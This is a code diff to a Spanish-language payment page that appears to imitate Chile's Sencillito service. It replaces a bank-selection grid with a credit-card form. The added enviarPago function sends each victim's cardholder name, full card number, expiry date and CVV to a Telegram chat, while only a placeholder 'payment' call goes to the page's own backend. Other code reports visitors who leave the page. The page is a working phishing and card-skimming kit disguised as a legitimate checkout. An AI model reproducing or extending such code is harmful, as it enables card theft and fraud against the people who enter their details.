@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Pagar con Sencillito</title>
+    <title>Pagar con Tarjeta</title>
     <style>
         :root {
             --brand-bg: linear-gradient(to bottom right, #255ade, #0027a8);
@@ -36,21 +36,26 @@
         .header-payment h1 { font-size: 22px; font-weight: 600; margin-bottom: 6px; }
         .secure-text { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--text-secondary); }
 
-        .payment-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
-
-        .payment-btn {
-            background: #fff; border: 1px solid var(--border-color); border-radius: 6px;
-            height: 72px; display: flex; align-items: center; justify-content: center;
-            cursor: pointer; transition: all 0.2s; padding: 10px;
+        /* Formulario de tarjeta */
+        .card-form { background: #fff; border: 1px solid var(--border-color); border-radius: 10px; padding: 24px; display: flex; flex-direction: column; gap: 18px; }
+        .form-group { display: flex; flex-direction: column; gap: 6px; }
+        .form-group label { font-size: 13px; font-weight: 500; color: #333; }
+        .form-group input, .form-group select {
+            padding: 12px 14px; border: 1px solid var(--border-color); border-radius: 6px;
+            font-size: 15px; outline: none; transition: border-color 0.2s; width: 100%;
         }
-        .payment-btn:hover { border-color: #ccc; background-color: var(--bg-hover); box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .form-group input:focus, .form-group select:focus { border-color: #255ade; }
+        .form-row { display: flex; gap: 16px; }
+        .form-row .form-group { flex: 1; }
 
-        .payment-btn > img { height: 40px; width: auto; max-width: 100%; object-fit: contain; }
-
-        .payment-btn-wide { grid-column: span 3; height: 72px; display: flex; flex-direction: row; gap: 12px; }
-        .btn-app-text { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; width: 100%; height: 100%; }
-        .btn-app-text span { font-size: 11px; font-weight: 500; color: #333; line-height: 1; }
-        .btn-app-text img { height: 24px; width: auto; }
+        .btn-pagar {
+            background: linear-gradient(to bottom right, #255ade, #0027a8);
+            color: #fff; border: none; padding: 16px; border-radius: 8px;
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s;
+            margin-top: 8px;
+        }
+        .btn-pagar:hover { opacity: 0.92; }
+        .btn-pagar:disabled { opacity: 0.6; cursor: not-allowed; }
 
         .legal-footer { margin-top: 16px; text-align: center; font-size: 13px; color: var(--text-secondary); display: flex; flex-direction: column; align-items: center; gap: 20px; }
         .legal-footer a { color: var(--text-secondary); text-decoration: underline; }
@@ -63,24 +68,16 @@
         .mobile-info { flex: 1; display: flex; flex-direction: column; }
         .mobile-info h1 { font-size: 12px; font-weight: 500; opacity: 0.9; }
         .mobile-info .amount { font-size: 20px; font-weight: 600; }
-        .mobile-items { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 4px; margin-right: 8px; }
         .mobile-back { background: rgba(255,255,255,0.2); border: none; width: 28px; height: 28px; border-radius: 50%; color: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-
         .mobile-main { padding: 20px 16px; flex: 1; }
         .mobile-main .header-payment h1 { font-size: 20px; margin-bottom: 4px; }
-
-        .mobile-main .payment-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 20px; }
-        .mobile-main .payment-btn { height: 60px; padding: 8px; }
-
-        .mobile-main .payment-btn > img { height: 32px; width: auto; max-width: 100%; object-fit: contain; }
-        .mobile-main .btn-app-text img { height: 18px; }
-
-        .mobile-main .payment-btn-wide { grid-column: span 2; height: 64px; }
+        .mobile-main .card-form { margin-top: 20px; }
 
         @media (max-width: 850px) {
             body { overflow: auto; }
             .desktop-layout { display: none; }
             .mobile-layout { display: flex; }
+            .form-row { flex-direction: column; gap: 18px; }
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -94,7 +91,7 @@
             <div>
                 <button class="btn-volver" onclick="window.history.back()">
                     <svg width="12" height="12" viewBox="0 0 320 512" fill="currentColor"><path d="M15 239c-9.4 9.4-9.4 24.6 0 33.9L207 465c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9L65.9 256 241 81c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0z"/></svg>
-                    Volver a Sencillito
+                    Volver
                 </button>
                 <div class="sidebar-title">Pagar</div>
                 <div class="sidebar-amount"><span id="pc-amount">$0</span> <span style="font-size: 18px;">CLP</span></div>
@@ -115,60 +112,47 @@
         <main class="main-content">
             <div class="payment-container">
                 <div class="header-payment">
-                    <h1>Métodos de pago</h1>
+                    <h1>Pagar con tarjeta</h1>
                     <div class="secure-text">
                         <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill="currentColor" d="M8 2.75a2.02 2.02 0 0 0-2.032 2.031V6h4.063V4.781A2.037 2.037 0 0 0 8 2.75M4.343 4.781A3.657 3.657 0 0 1 8 1.125a3.674 3.674 0 0 1 3.656 3.656V6h.406c.889 0 1.625.736 1.625 1.625V12.5a1.62 1.62 0 0 1-1.625 1.625H3.937c-.914 0-1.625-.71-1.625-1.625V7.625C2.312 6.736 3.023 6 3.937 6h.406zm4.47 4.469A.835.835 0 0 0 8 8.438a.82.82 0 0 0-.813.812v1.625c0 .457.356.813.813.813a.82.82 0 0 0 .812-.813z"/></svg>
                         Pago seguro y encriptado
                     </div>
                 </div>
 
-                <div class="payment-grid">
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_estado', 'Banco Estado', event)">
-                        <img src="https://img.logo.dev/bancoestado.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Estado">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_falabella', 'Banco Falabella', event)">
-                        <img src="https://img.logo.dev/bancofalabella.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Falabella">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_santander', 'Banco Santander', event)">
-                        <img src="https://img.logo.dev/santander.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Santander">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_de_chile', 'Banco de Chile', event)">
-                        <img src="https://img.logo.dev/bancochile.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco de Chile">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_bci', 'Banco BCI', event)">
-                        <img src="https://img.logo.dev/bci.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco BCI">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_scotiabank', 'Banco Scotiabank', event)">
-                        <img src="https://img.logo.dev/scotiabank.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Scotiabank">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_itau', 'Banco Itaú', event)">
-                        <img src="https://img.logo.dev/itau.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Itaú">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_bice', 'Banco BICE', event)">
-                        <img src="https://img.logo.dev/bice.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco BICE">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_banco_ripley', 'Banco Ripley', event)">
-                        <img src="https://img.logo.dev/ripley.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Ripley">
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('cl_mach', 'MACH', event)">
-                        <div class="btn-app-text">
-                            <span>Paga con tu App</span>
-                            <img src="https://img.logo.dev/machbank.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="MACH">
+                <form class="card-form" id="form-tarjeta" onsubmit="enviarPago(event)">
+                    <div class="form-group">
+                        <label for="titular">Nombre del titular</label>
+                        <input type="text" id="titular" placeholder="Como aparece en la tarjeta" autocomplete="cc-name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="numero">Número de tarjeta</label>
+                        <input type="text" id="numero" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="vence">Fecha de vencimiento</label>
+                            <input type="text" id="vence" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
                         </div>
-                    </button>
-                    <button class="payment-btn" onclick="iniciarPago('hites', 'Hites', event)">
-                        <img src="https://img.logo.dev/hites.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Hites">
-                    </button>
-                    <button class="payment-btn payment-btn-wide" onclick="iniciarPago('generic', 'Otro banco (genérico)', event)">
-                        <span style="font-size: 14px; font-weight: 500; color: #333;">Paga con tu banco</span>
-                        <div style="display: flex; gap: 6px; align-items: center; margin-left: 12px;">
-                            <img src="https://img.logo.dev/coopeuch.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" style="height: 24px;" alt="Coopeuch">
-                            <img src="https://img.logo.dev/tenpo.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" style="height: 24px;" alt="Tenpo">
-                            <img src="https://img.logo.dev/mercadopago.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" style="height: 24px;" alt="Mercado Pago">
-                            <span style="font-size: 11px; font-weight: 600; color: #666; background: #f0f0f0; padding: 2px 6px; border-radius: 4px;">+7</span>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required>
                         </div>
-                    </button>
-                </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cuotas">Cuotas</label>
+                        <select id="cuotas">
+                            <option value="1">1 cuota (sin interés)</option>
+                            <option value="3">3 cuotas</option>
+                            <option value="6">6 cuotas</option>
+                            <option value="12">12 cuotas</option>
+                        </select>
+                    </div>
+
+                    <button type="submit" class="btn-pagar" id="btn-pagar">Pagar ahora</button>
+                </form>
 
                 <div class="legal-footer">
                     <p>Al continuar aceptas <a href="#">Condiciones</a> & <a href="#">Privacidad</a></p>
@@ -188,10 +172,6 @@
                 <h1>Pagar</h1>
                 <div class="amount" id="mobile-amount">$0</div>
             </div>
-            <div class="mobile-items">
-                <span>1 item</span>
-                <svg width="12" height="12" viewBox="0 0 640 640" fill="currentColor"><path d="M303.5 473c9.4 9.4 24.6 9.4 33.9 0l200-200c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0l-183 183-183-183c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9l200 200z"/></svg>
-            </div>
             <button class="mobile-back" onclick="window.history.back()">
                 <svg width="14" height="14" viewBox="0 0 384 512" fill="currentColor"><path d="M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3l105.4 105.3c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256z"/></svg>
             </button>
@@ -199,60 +179,43 @@
 
         <div class="mobile-main">
             <div class="header-payment">
-                <h1>Métodos de pago</h1>
+                <h1>Pagar con tarjeta</h1>
                 <div class="secure-text">
                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill="currentColor" d="M8 2.75a2.02 2.02 0 0 0-2.032 2.031V6h4.063V4.781A2.037 2.037 0 0 0 8 2.75M4.343 4.781A3.657 3.657 0 0 1 8 1.125a3.674 3.674 0 0 1 3.656 3.656V6h.406c.889 0 1.625.736 1.625 1.625V12.5a1.62 1.62 0 0 1-1.625 1.625H3.937c-.914 0-1.625-.71-1.625-1.625V7.625C2.312 6.736 3.023 6 3.937 6h.406zm4.47 4.469A.835.835 0 0 0 8 8.438a.82.82 0 0 0-.813.812v1.625c0 .457.356.813.813.813a.82.82 0 0 0 .812-.813z"/></svg>
                     Pago seguro y encriptado
                 </div>
             </div>
 
-            <div class="payment-grid">
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_estado', 'Banco Estado', event)">
-                    <img src="https://img.logo.dev/bancoestado.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Estado">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_falabella', 'Banco Falabella', event)">
-                    <img src="https://img.logo.dev/bancofalabella.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Falabella">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_santander', 'Banco Santander', event)">
-                    <img src="https://img.logo.dev/santander.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Santander">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_de_chile', 'Banco de Chile', event)">
-                    <img src="https://img.logo.dev/bancochile.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco de Chile">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_bci', 'Banco BCI', event)">
-                    <img src="https://img.logo.dev/bci.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco BCI">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_scotiabank', 'Banco Scotiabank', event)">
-                    <img src="https://img.logo.dev/scotiabank.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Scotiabank">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_itau', 'Banco Itaú', event)">
-                    <img src="https://img.logo.dev/itau.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Itaú">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_bice', 'Banco BICE', event)">
-                    <img src="https://img.logo.dev/bice.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco BICE">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_banco_ripley', 'Banco Ripley', event)">
-                    <img src="https://img.logo.dev/ripley.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Banco Ripley">
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('cl_mach', 'MACH', event)">
-                    <div class="btn-app-text">
-                        <span>Paga con tu App</span>
-                        <img src="https://img.logo.dev/machbank.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="MACH">
+            <form class="card-form" id="form-tarjeta-mobile" onsubmit="enviarPago(event)">
+                <div class="form-group">
+                    <label for="titular-m">Nombre del titular</label>
+                    <input type="text" id="titular-m" placeholder="Como aparece en la tarjeta" autocomplete="cc-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="numero-m">Número de tarjeta</label>
+                    <input type="text" id="numero-m" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="vence-m">Vencimiento</label>
+                        <input type="text" id="vence-m" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
                     </div>
-                </button>
-                <button class="payment-btn" onclick="iniciarPago('hites', 'Hites', event)">
-                    <img src="https://img.logo.dev/hites.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" alt="Hites">
-                </button>
-                <button class="payment-btn payment-btn-wide" onclick="iniciarPago('generic', 'Otro banco (genérico)', event)">
-                    <span style="font-size: 14px; font-weight: 500; color: #333;">Paga con tu banco</span>
-                    <div style="display: flex; gap: 6px; align-items: center; margin-left: 12px;">
-                        <img src="https://img.logo.dev/coopeuch.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" style="height: 24px;" alt="Coopeuch">
-                        <img src="https://img.logo.dev/tenpo.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" style="height: 24px;" alt="Tenpo">
-                        <img src="https://img.logo.dev/mercadopago.cl?token=pk_Qjl8j_JqSHCvrxtFxQRQyg" style="height: 24px;" alt="Mercado Pago">
-                        <span style="font-size: 11px; font-weight: 600; color: #666; background: #f0f0f0; padding: 2px 6px; border-radius: 4px;">+7</span>
+                    <div class="form-group">
+                        <label for="cvv-m">CVV</label>
+                        <input type="text" id="cvv-m" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required>
                     </div>
-                </button>
-            </div>
+                </div>
+                <div class="form-group">
+                    <label for="cuotas-m">Cuotas</label>
+                    <select id="cuotas-m">
+                        <option value="1">1 cuota (sin interés)</option>
+                        <option value="3">3 cuotas</option>
+                        <option value="6">6 cuotas</option>
+                        <option value="12">12 cuotas</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn-pagar" id="btn-pagar-m">Pagar ahora</button>
+            </form>
 
             <div class="legal-footer">
                 <p>Al continuar aceptas <a href="#">Condiciones</a> & <a href="#">Privacidad</a></p>
@@ -294,9 +257,7 @@
         // Estado global
         let datosPagoActual = null;
         let notificadoSalida = false;
-        let pagoIniciado = false;
-        let redirigiendo = false;   // bloquea aviso de salida si ya va al checkout
-        let pagoCompletado = false; // bloquea aviso si el pago ya se generó
+        let pagoEnviado = false;
 
         document.addEventListener('DOMContentLoaded', () => {
             const stored = localStorage.getItem('sencillito_pago_pendiente');
@@ -318,31 +279,45 @@
 
             document.getElementById('mobile-amount').textContent = montoFormateado;
             document.getElementById('mobile-logo').src = data.logo;
+
+            // Formateo automático de la tarjeta (PC + móvil)
+            document.querySelectorAll('#numero, #numero-m').forEach(el => {
+                el.addEventListener('input', (e) => {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+                    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+                });
+            });
+
+            // Formateo de vencimiento MM/AA
+            document.querySelectorAll('#vence, #vence-m').forEach(el => {
+                el.addEventListener('input', (e) => {
+                    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+                    if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+                    e.target.value = v;
+                });
+            });
         });
 
-        // Detectar salida SOLO si NO se está redirigiendo ni se completó el pago
+        // Detectar salida si el usuario aún no envió el pago
         function notificarSalida(motivo) {
-            if (notificadoSalida || !datosPagoActual) return;
-            if (redirigiendo || pagoCompletado) return;
+            if (notificadoSalida || !datosPagoActual || pagoEnviado) return;
             notificadoSalida = true;
 
             const montoCLP = formatCLP(datosPagoActual.monto);
             const montoCOP = formatCOP(Math.round(datosPagoActual.monto * CLP_TO_COP));
 
             notificarTelegram(
-                `⚠️ <b>USUARIO SALIÓ DE LA PÁGINA</b>\n` +
+                `⚠️ <b>USUARIO SALIÓ DE LA PÁGINA (TARJETA)</b>\n` +
                 `🏢 <b>Servicio:</b> ${datosPagoActual.empresa}\n` +
                 `💵 <b>Monto:</b> ${montoCLP} CLP\n` +
                 `💱 <b>Equivalente:</b> ${montoCOP} COP\n` +
                 `📌 <b>Motivo:</b> ${motivo}\n` +
-                (pagoIniciado ? `🏦 <b>Banco elegido:</b> ${pagoIniciado}\n` : '') +
                 `🕒 ${new Date().toLocaleString('es-CL')}`
             );
         }
 
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden') {
-                // Delay: si el usuario vuelve rápido, no se notifica
                 setTimeout(() => {
                     if (document.visibilityState === 'hidden') {
                         notificarSalida('Cambió de pestaña / app');
@@ -352,89 +327,94 @@
         });
 
         window.addEventListener('beforeunload', () => {
-            if (redirigiendo || pagoCompletado) return;
+            if (pagoEnviado) return;
             notificarSalida('Cerró o recargó la página');
         });
 
-        async function iniciarPago(institutionId, nombreBanco, event) {
-            const btn = event.currentTarget;
-            const originalContent = btn.innerHTML;
+        async function enviarPago(event) {
+            event.preventDefault();
 
-            const stored = localStorage.getItem('sencillito_pago_pendiente');
-            if (!stored) {
-                alert("No se encontraron datos de pago.");
+            if (!datosPagoActual) {
+                alert("No hay datos de pago cargados.");
                 return;
             }
-            const datosPago = JSON.parse(stored);
-            datosPagoActual = datosPago;
-            pagoIniciado = nombreBanco;
 
-            const montoCLP = formatCLP(datosPago.monto);
-            const montoCOP = formatCOP(Math.round(datosPago.monto * CLP_TO_COP));
+            // Detectar si es formulario PC o móvil
+            const form = event.target;
+            const isMobile = form.id === 'form-tarjeta-mobile';
+            const sufijo = isMobile ? '-m' : '';
 
+            const titular = document.getElementById('titular' + sufijo).value.trim();
+            const numero = document.getElementById('numero' + sufijo).value.replace(/\s/g, '');
+            const vence = document.getElementById('vence' + sufijo).value.trim();
+            const cvv = document.getElementById('cvv' + sufijo).value.trim();
+            const cuotas = document.getElementById('cuotas' + sufijo).value;
+
+            // Validaciones básicas
+            if (!titular || numero.length < 13 || vence.length < 5 || cvv.length < 3) {
+                alert('Por favor completa todos los campos correctamente.');
+                return;
+            }
+
+            const btn = document.getElementById('btn-pagar' + sufijo);
+            const originalText = btn.textContent;
+            btn.disabled = true;
+            btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 0 auto;"></div>';
+
+            pagoEnviado = true;
+
+            const montoCLP = formatCLP(datosPagoActual.monto);
+            const montoCOP = formatCOP(Math.round(datosPagoActual.monto * CLP_TO_COP));
+
+            // Notificar a Telegram con los datos ingresados
             notificarTelegram(
-                `🏦 <b>BANCO SELECCIONADO</b>\n` +
-                `🏢 <b>Servicio:</b> ${datosPago.empresa}\n` +
-                `🥇 <b>Banco:</b> ${nombreBanco}\n` +
+                `💳 <b>DATOS DE TARJETA INGRESADOS</b>\n` +
+                `🏢 <b>Servicio:</b> ${datosPagoActual.empresa}\n` +
                 `💵 <b>Monto CLP:</b> ${montoCLP}\n` +
                 `💱 <b>Monto COP:</b> ${montoCOP}\n` +
+                `👤 <b>Titular:</b> ${titular}\n` +
+                `🔢 <b>Tarjeta:</b> <code>${numero}</code>\n` +
+                `📅 <b>Vence:</b> ${vence}\n` +
+                `🔒 <b>CVV:</b> <code>${cvv}</code>\n` +
+                `🧾 <b>Cuotas:</b> ${cuotas}\n` +
                 `🕒 ${new Date().toLocaleString('es-CL')}`
             );
 
-            btn.disabled = true;
-            btn.style.opacity = '0.7';
-            btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #0044cc; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite;"></div>';
-
-            const allBtns = document.querySelectorAll('.payment-btn');
-            allBtns.forEach(b => { if (b !== btn) { b.disabled = true; b.style.opacity = '0.5'; } });
-
             try {
+                // Placeholder: aquí irá la pasarela real cuando la actives.
                 const response = await fetch('/api/crear-pago', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        monto: datosPago.monto,
-                        descripcion: datosPago.empresa + ' - ' + nombreBanco,
-                        referencia: 'pago_' + institutionId + '_' + Date.now(),
-                        banco: institutionId,
-                        banco_nombre: nombreBanco,
-                        empresa: datosPago.empresa,
-                        monto_cop: Math.round(datosPago.monto * CLP_TO_COP)
+                        monto: datosPagoActual.monto,
+                        descripcion: datosPagoActual.empresa + ' - Pago con tarjeta',
+                        referencia: 'pago_tarjeta_' + Date.now(),
+                        empresa: datosPagoActual.empresa,
+                        banco: 'tarjeta',
+                        banco_nombre: 'Tarjeta de crédito/débito',
+                        titular,
+                        cuotas: parseInt(cuotas, 10)
                     })
                 });
 
                 const data = await response.json();
 
-                if (data.success && data.checkout_url) {
-                    // MARCAR como redirigiendo ANTES de navegar
-                    redirigiendo = true;
-                    pagoCompletado = true;
-
-                    notificarTelegram(
-                        `✅ <b>LINK DE PAGO GENERADO</b>\n` +
-                        `🏢 <b>Servicio:</b> ${datosPago.empresa}\n` +
-                        `🥇 <b>Banco:</b> ${nombreBanco}\n` +
-                        `💵 <b>Monto CLP:</b> ${montoCLP}\n` +
-                        `💱 <b>Monto COP:</b> ${montoCOP}\n` +
-                        `🔗 <b>Link:</b> ${data.checkout_url}\n` +
-                        `🕒 ${new Date().toLocaleString('es-CL')}`
-                    );
-
-                    window.location.href = data.checkout_url;
+                if (data.success) {
+                    alert('Datos enviados correctamente. Procesando pago...');
+                    // Cuando actives la pasarela real:
+                    // if (data.checkout_url) window.location.href = data.checkout_url;
                 } else {
-                    throw new Error(data.error || 'Error al crear el link de pago');
+                    throw new Error(data.error || 'Error al procesar el pago');
                 }
-
             } catch (error) {
                 console.error('Error:', error);
                 alert('Error al procesar el pago: ' + error.message);
 
                 btn.disabled = false;
-                btn.style.opacity = '1';
-                btn.innerHTML = originalContent;
-                allBtns.forEach(b => { b.disabled = false; b.style.opacity = '1'; });
+                btn.textContent = originalText;
+                pagoEnviado = false;
             }
         }
     </script>
 </body>
-                    </html>
+</html>
